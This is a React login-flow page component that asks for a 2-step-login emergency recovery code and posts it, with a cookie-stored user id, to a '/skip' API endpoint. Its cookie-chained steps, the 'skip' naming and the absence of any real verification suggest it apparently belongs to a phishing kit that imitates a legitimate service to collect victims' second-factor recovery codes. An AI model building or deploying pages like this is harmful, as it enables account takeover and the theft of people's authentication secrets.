import { Form, Formik } from "formik";
import { API_URL } from "../config";
import Header from "../components/Header";
import Footer from "../components/Footer";
import Cookies from "js-cookie";
import InputField from "../components/InputField";
import { toast } from "react-toastify";

function RecoveryAuthPage() {
  const id = Cookies.get("id");

  const initialvalues = {
    id: id,
    skipcode: "",
  };

  const handleSubmit = async (values, formik) => {
    // console.log(values);

    // const { skipcode } = values;
    // Cookies.set("skipcode", skipcode);
    // router.push("/account/email");
    // return;

    const url = `${API_URL}/skip`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      toast.success("Login Succecssfull");
      formik.resetForm();
      // router.push("/account/email");
      // Cookies.remove("id");
      // Cookies.remove("email");
    } else {
      console.log("error", data);
      // toast.error("Something Went Wrong");
    }
  };
  return (
    <>
      <Header />
      <div className="container px-5 lg:px-0 mt-[20px] lg:mt-[45px] mb-[30px] lg:mb-[70px]">
        <div className="max-w-[630px] text-custom-gray3">
          <div>
            <div>
              <h1 className="font-Assistant text-[26px] lg:text-[44px]  font-extrabold">
                Enter emergency recovery code
              </h1>
              <div className="bg-custom-red h-[5px] w-[80px] rounded-xl"></div>
            </div>

            <p className="mt-[100px]">
              An emergency recovery code is one of the codes we showed you after
              you set up 2-step login. Each emergency recovery code can be used
              exactly once.
            </p>

            <div className="mt-[20px] lg:mt-[70px]">
              <Formik
                initialValues={initialvalues}
                // validationSchema={validate}
                onSubmit={handleSubmit}
              >
                {(formik) => (
                  <Form className="">
                    <div className="space-y-[60px]">
                      <InputField
                        label="EMERGENCY RECOVERY CODE"
                        id="skipcode"
                        name="skipcode"
                        type="text"
                      />
                    </div>

                    <div className="mt-[50px] font-Assistant text-[24px] text-[#5d738d] uppercase font-medium">
                      <button
                        type="submit"
                        className="bg-custom-rose border-2 border-custom-rose hover:bg-custom-red2 px-[20px] lg:px-[35px] py-[6px] lg:py-[8px] text-white text-[18px] lg:text-[24px] font-bold rounded-full active:scale-90 transition-all duration-300"
                        // disabled={!verified}
                      >
                        Authenticate
                      </button>
                    </div>
                  </Form>
                )}
              </Formik>
            </div>

            <p className="mt-[108px] mb-[73px] font-medium">Log out instead</p>
          </div>
        </div>
      </div>
      <Footer />
    </>
  );
}

export default RecoveryAuthPage;
